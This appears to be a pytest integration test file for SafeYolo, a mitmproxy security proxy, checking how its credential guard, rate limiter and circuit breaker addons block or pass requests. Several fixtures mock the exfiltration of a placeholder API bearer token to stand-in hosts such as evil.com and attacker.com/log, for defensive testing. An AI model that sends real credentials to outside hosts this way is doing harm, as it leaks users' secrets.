"""
Integration tests for SafeYolo addon chain.

Tests that addons work together correctly via flow.metadata sharing.
"""

import pytest


class TestAddonChainMetadata:
    """Tests for addon communication via flow.metadata."""

    def test_credential_guard_sets_blocked_by(self, credential_guard, make_flow):
        """Test that credential_guard sets blocked_by metadata."""
        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            headers={"Authorization": f"Bearer sk-proj-{'a' * 80}"},
        )

        credential_guard.request(flow)

        assert flow.metadata.get("blocked_by") == "credential-guard"
        assert flow.metadata.get("credential_fingerprint") is not None

    def test_rate_limiter_sets_blocked_by(self, rate_limiter, make_flow, tmp_path):
        """Test that rate_limiter sets blocked_by metadata."""
        from addons.policy_engine import init_policy_engine
        import addons.policy_engine as pe

        # Save and restore engine
        old_engine = pe._policy_engine

        # Create baseline with low budget for test.com
        baseline = tmp_path / "baseline.yaml"
        baseline.write_text("""
metadata:
  version: "1.0"
permissions:
  - action: network:request
    resource: "test.com/*"
    effect: budget
    budget: 2
budgets: {}
required: []
addons: {}
domains: {}
""")
        init_policy_engine(baseline_path=baseline)

        try:
            # Exhaust budget (2 requests allowed)
            flow1 = make_flow(url="http://test.com/api")
            rate_limiter.request(flow1)
            flow2 = make_flow(url="http://test.com/api")
            rate_limiter.request(flow2)

            # Get blocked on 3rd
            flow3 = make_flow(url="http://test.com/api")
            rate_limiter.request(flow3)

            assert flow3.metadata.get("blocked_by") == "rate-limiter"
        finally:
            pe._policy_engine = old_engine

    def test_circuit_breaker_sets_blocked_by(self, circuit_breaker, make_flow):
        """Test that circuit_breaker sets blocked_by metadata."""
        circuit_breaker.force_open("test.com")

        flow = make_flow(url="http://test.com/api")
        circuit_breaker.request(flow)

        assert flow.metadata.get("blocked_by") == "circuit-breaker"

    def test_allowed_requests_not_blocked(self, credential_guard, make_flow):
        """Test that allowed requests pass through without blocking."""
        flow = make_flow(
            method="POST",
            url="https://api.openai.com/v1/chat",
            headers={"Authorization": f"Bearer sk-proj-{'a' * 80}"},
        )

        credential_guard.request(flow)

        assert flow.response is None  # Not blocked


class TestAddonChainOrder:
    """Tests for addon execution order semantics."""

    def test_first_blocker_wins(self, credential_guard, rate_limiter, make_flow, tmp_path):
        """Test that first addon to block sets response."""
        from addons.policy_engine import init_policy_engine
        import addons.policy_engine as pe

        # Save and restore engine
        old_engine = pe._policy_engine

        # Create baseline with low budget for evil.com
        baseline = tmp_path / "baseline.yaml"
        baseline.write_text("""
metadata:
  version: "1.0"
permissions:
  - action: network:request
    resource: "evil.com/*"
    effect: budget
    budget: 2
budgets: {}
required: []
addons: {}
domains: {}
""")
        init_policy_engine(baseline_path=baseline)

        try:
            # Exhaust rate limit (2 requests allowed)
            flow1 = make_flow(url="http://evil.com/api")
            rate_limiter.request(flow1)
            flow2 = make_flow(url="http://evil.com/api")
            rate_limiter.request(flow2)

            # Create flow that would be blocked by both addons
            flow = make_flow(
                method="POST",
                url="https://evil.com/api",
                headers={"Authorization": f"Bearer sk-proj-{'a' * 80}"},
            )

            # If rate_limiter runs first (as in production chain)
            rate_limiter.request(flow)
            assert flow.response is not None
            assert flow.metadata.get("blocked_by") == "rate-limiter"
        finally:
            pe._policy_engine = old_engine


class TestRealisticScenarios:
    """Tests for realistic usage scenarios."""

    def test_openai_request_through_chain(self, credential_guard, rate_limiter, circuit_breaker, make_flow, make_response):
        """Test a realistic OpenAI API request through the chain."""
        flow = make_flow(
            method="POST",
            url="https://api.openai.com/v1/chat/completions",
            headers={
                "Authorization": f"Bearer sk-proj-{'a' * 80}",
                "Content-Type": "application/json",
            },
        )

        # Run through addons (in production order)
        rate_limiter.request(flow)
        assert flow.response is None, "Should pass rate limiter"

        circuit_breaker.request(flow)
        assert flow.response is None, "Should pass circuit breaker"

        credential_guard.request(flow)
        assert flow.response is None, "Should pass credential guard (correct host)"

        # Simulate success response
        flow.response = make_response(status_code=200)
        circuit_breaker.response(flow)

        status = circuit_breaker.get_status("api.openai.com")
        assert status.failure_count == 0

    def test_exfiltration_attempt_blocked(self, credential_guard, make_flow):
        """Test that credential exfiltration to wrong host is blocked."""
        flow = make_flow(
            method="POST",
            url="https://attacker.com/log",
            headers={"Authorization": f"Bearer sk-proj-{'a' * 80}"},
        )

        credential_guard.request(flow)

        assert flow.response is not None
        assert flow.response.status_code == 428
        assert b"credential" in flow.response.content.lower()

    def test_circuit_opens_on_upstream_failures(self, circuit_breaker, make_flow, make_response):
        """Test circuit opens after upstream service fails repeatedly."""
        from addons.circuit_breaker import CircuitState

        circuit_breaker.failure_threshold = 3

        # Simulate 3 failed requests
        for i in range(3):
            flow = make_flow(url="http://failing-service.com/api")
            circuit_breaker.request(flow)
            flow.response = make_response(status_code=500, content=b"Internal Server Error")
            circuit_breaker.response(flow)

        # Circuit should now be open
        status = circuit_breaker.get_status("failing-service.com")
        assert status.state == CircuitState.OPEN

        # New requests should be blocked
        new_flow = make_flow(url="http://failing-service.com/api")
        circuit_breaker.request(new_flow)
        assert new_flow.response.status_code == 503


class TestEdgeCases:
    """Tests for edge cases and error handling."""

    def test_empty_body_request(self, credential_guard, make_flow):
        """Test handling of empty body requests."""
        flow = make_flow(
            method="GET",
            url="https://api.openai.com/v1/models",
            content=b"",
        )

        # Should not crash
        credential_guard.request(flow)
        assert flow.response is None

    def test_binary_body_request(self, credential_guard, make_flow):
        """Test handling of binary content."""
        flow = make_flow(
            method="POST",
            url="https://api.openai.com/v1/audio",
            content=b"\x00\x01\x02\x03binary data",
            headers={"Content-Type": "audio/wav"},
        )

        # Should not crash on binary content
        credential_guard.request(flow)
        assert flow.response is None

    def test_missing_host(self, rate_limiter, make_flow):
        """Test handling when host cannot be determined."""
        flow = make_flow(url="http://example.com/")
        # Mangle the host
        flow.request.host = ""

        # Should not crash
        rate_limiter.request(flow)


class TestBlockingMode:
    """Tests for blocking vs warn-only mode across security addons."""

    def test_credential_guard_warn_mode_passes_request(self, make_flow, tmp_path):
        """Test credential_guard in warn mode allows request through."""
        from addons.credential_guard import CredentialGuard, DEFAULT_RULES
        from addons.policy_engine import init_policy_engine
        from mitmproxy.test import taddons
        import addons.policy_engine as pe

        # Save and restore engine
        old_engine = pe._policy_engine

        # Create minimal baseline for test
        baseline = tmp_path / "baseline.yaml"
        baseline.write_text("""
metadata:
  version: "1.0"
permissions:
  - action: credential:use
    resource: "*"
    effect: prompt
budgets: {}
required: []
addons: {}
domains: {}
""")
        init_policy_engine(baseline_path=baseline)

        try:
            guard = CredentialGuard()
            guard.rules = list(DEFAULT_RULES)
            guard.hmac_secret = b"test-secret"
            guard.config = {}
            guard.safe_headers_config = {}

            with taddons.context(guard) as tctx:
                tctx.options.credguard_block = False  # Warn-only mode

                flow = make_flow(
                    method="POST",
                    url="https://evil.com/api",
                    headers={"Authorization": f"Bearer sk-proj-{'a' * 80}"},
                )

                guard.request(flow)

                # Warn-only: no response set, request continues
                assert flow.response is None
                assert guard.violations_total == 1
        finally:
            pe._policy_engine = old_engine

    def test_default_is_block_mode(self):
        """Test that default behavior is block mode."""
        from addons.credential_guard import CredentialGuard
        from mitmproxy.test import taddons

        guard = CredentialGuard()

        # When properly configured with context, default is block mode
        with taddons.context(guard) as tctx:
            assert tctx.options.credguard_block is True
            assert guard._should_block() is True
